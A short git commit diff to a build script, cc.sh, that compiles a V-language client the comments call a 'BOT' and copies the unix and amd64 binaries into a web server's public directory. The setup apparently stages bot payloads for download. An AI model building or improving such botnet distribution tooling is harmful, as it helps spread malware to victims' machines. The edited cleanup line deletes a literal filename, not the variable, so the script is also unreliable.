ed497a01ffc316533434f4ceaa40e3a847c30753
Erupt <101347500+Eruptsy@users.noreply.github.com>
2022-06-17 17:23:50 -0400

    cross compiler fix

--- cc.sh
+++ cc.sh
@@ -1,11 +1,12 @@
 client_file="client.v"
+compiled_file="client"
 # Compile normal unix BOT => /var/www/html/unix
-/bin/v/v $client_file; cp $client_file unix; mv unix /var/www/html/
+/bin/v/v $client_file; cp $compiled_file unix; mv unix /var/www/html/
 # Compile amd64 BOT => /var/www/html/amd64
-/bin/v/v $client_file; cp $client_file amd64; mv amd64 /var/www/html/
+/bin/v/v $client_file; cp $compiled_file amd64; mv amd64 /var/www/html/
 
 # Delete Client
-rm -rf client
+rm -rf compiled_file
 
 system_ip=$(hostname -I)
 
